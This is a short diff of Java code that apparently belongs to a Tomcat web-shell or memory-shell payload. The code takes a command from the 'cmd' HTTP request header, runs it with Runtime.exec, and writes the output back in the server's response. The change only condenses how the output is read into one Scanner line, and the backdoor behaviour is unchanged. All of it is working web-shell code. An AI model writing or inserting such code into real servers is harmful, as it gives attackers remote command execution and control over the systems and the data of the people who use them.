@@ -53,18 +53,10 @@
 
                     String cmd = req.getHeader("cmd");
                     if (cmd != null) {
-                        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
-                        java.io.InputStreamReader isr = new java.io.InputStreamReader(in);
-                        java.io.BufferedReader br = new java.io.BufferedReader(isr);
-
-                        StringBuilder sb = new StringBuilder();
-                        String line;
-                        while ((line = br.readLine()) != null) {
-                            sb.append(line + "\n");
-                        }
+                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
 
                         org.apache.tomcat.util.buf.ByteChunk bc = new org.apache.tomcat.util.buf.ByteChunk();
-                        bc.setBytes(sb.toString().getBytes(), 0, sb.toString().getBytes().length);
+                        bc.setBytes(res.getBytes(), 0, res.getBytes().length);
                         req.getResponse().doWrite(bc);
                         break label;
                     }
